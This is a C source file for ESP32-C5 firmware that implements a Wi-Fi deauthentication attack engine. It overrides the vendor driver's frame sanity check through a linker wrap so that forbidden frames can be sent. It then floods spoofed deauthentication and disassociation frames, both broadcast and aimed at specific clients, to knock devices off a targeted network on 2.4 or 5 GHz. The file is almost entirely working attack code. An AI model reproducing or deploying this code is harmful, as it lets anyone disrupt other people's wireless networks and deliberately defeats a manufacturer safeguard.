/*
 * Deauthentication engine — ESP32-C5.
 *
 * Espressif's driver refuses to TX deauth/disassoc frames (gated by
 * ieee80211_raw_frame_sanity_check). We override it via the linker
 * (-Wl,-wrap=..., see main/CMakeLists.txt) and approve every frame here.
 *
 * We blast both deauth (0xC0) and disassoc (0xA0) to broadcast at full rate
 * (no per-frame delay) so the target's clients actually drop.
 */
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "deauth_engine.h"

static const uint8_t BROADCAST[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

// Which interface to inject through. The control AP is a 2.4 GHz AP parked on
// ch1, so it CANNOT transmit on a 5 GHz channel — frames sent via WIFI_IF_AP
// while the radio is tuned to a 5 GHz channel go nowhere. The STA interface has
// no fixed channel and follows esp_wifi_set_channel onto 5 GHz, so we inject 5
// GHz frames through it. 2.4 GHz keeps using the AP interface (proven to work).
static volatile wifi_interface_t s_tx_if = WIFI_IF_AP;
void deauth_set_tx_if(wifi_interface_t ifx) { s_tx_if = ifx; }

// Optional abort gate: when set (control.c does this while rewriting attack
// state), blast() stops within one frame instead of finishing its burst.
static const volatile bool *s_tx_gate = NULL;
void deauth_set_gate(const volatile bool *gate) { s_tx_gate = gate; }
static inline bool tx_halted(void) { return s_tx_gate && *s_tx_gate; }

// TX counters (for the live packets/sec readout).
static volatile uint32_t s_tx_ok = 0, s_tx_fail = 0;
void deauth_get_stats(uint32_t *ok, uint32_t *fail)
{
    if (ok) *ok = s_tx_ok;
    if (fail) *fail = s_tx_fail;
}

int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
{
    (void)a; (void)b; (void)c;
    return 0; // always ESP_OK
}

// 24-byte 802.11 management frame + 2-byte reason.
static uint8_t s_frame[26] = {
    0xC0, 0x00, 0x00, 0x00,               // [0] frame control, [2] duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // addr1 destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr2 source (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr3 BSSID
    0x00, 0x00,                           // seq
    0x01, 0x00,                           // reason 1 = unspecified
};

// Fire `count` frames of `subtype` (0xC0 deauth / 0xA0 disassoc). addr1=dest,
// addr2=src, addr3=bssid. Retries on NO_MEM so every frame actually goes out.
static int blast(uint8_t subtype, const uint8_t dest[6], const uint8_t src[6],
                 const uint8_t bssid[6], uint16_t reason, int count)
{
    s_frame[0] = subtype;
    memcpy(&s_frame[4],  dest,  6);
    memcpy(&s_frame[10], src,   6);
    memcpy(&s_frame[16], bssid, 6);
    s_frame[24] = reason & 0xff;
    s_frame[25] = reason >> 8;

    // en_sys_seq MUST be true once Wi-Fi is started (AP up), or the driver
    // rejects the frame with ESP_ERR_INVALID_ARG and nothing transmits.
    // TX buffer holds a limited number of frames; when it's full the driver
    // returns ESP_ERR_NO_MEM. Wait and retry so every requested frame actually
    // goes out, instead of dropping it.
    int sent = 0, guard = 0;
    while (sent < count && guard < count * 8) {
        guard++;
        if (tx_halted()) break;                            // attack state rewrite
        esp_err_t e = esp_wifi_80211_tx(s_tx_if, s_frame, sizeof(s_frame), true);
        if (e == ESP_OK) { s_tx_ok++; sent++; }
        else if (e == ESP_ERR_NO_MEM) { vTaskDelay(1); }   // buffer full, drain
        else { s_tx_fail++; }                              // real error: NOT sent
    }
    return sent;
}

int deauth_send(const uint8_t bssid[6], const uint8_t dest[6],
                uint16_t reason, int count)
{
    if (!bssid || !dest) return -1;
    blast(0xC0, dest, bssid, bssid, reason, count);
    return 0;
}

int deauth_attack_network(const wifi_network_t *net, int burst)
{
    if (!net) return 0;

    wifi_set_channel_band(net->channel, net->is_5ghz);
    // 5 GHz must inject via STA (AP is 2.4 GHz-only); 2.4 GHz via AP.
    deauth_set_tx_if(net->is_5ghz ? WIFI_IF_STA : WIFI_IF_AP);
    vTaskDelay(pdMS_TO_TICKS(2));          // let the PHY settle

    // Broadcast: deauth + disassoc from the AP to every client.
    int sent  = blast(0xC0, BROADCAST, net->bssid, net->bssid, 7, burst);
    sent     += blast(0xA0, BROADCAST, net->bssid, net->bssid, 8, burst);
    return sent;
}

// Directed (unicast) deauth — far more effective than broadcast. Sends both
// AP->client and client->AP so both sides tear the association down. Assumes
// the radio is already on the AP's channel.
int deauth_client(const uint8_t bssid[6], const uint8_t client[6], int burst)
{
    int sent  = blast(0xC0, client, bssid, bssid, 7, burst);   // AP -> client
    sent     += blast(0xC0, bssid, client, bssid, 7, burst);   // client -> AP
    sent     += blast(0xA0, client, bssid, bssid, 8, burst);   // disassoc AP->client
    return sent;
}
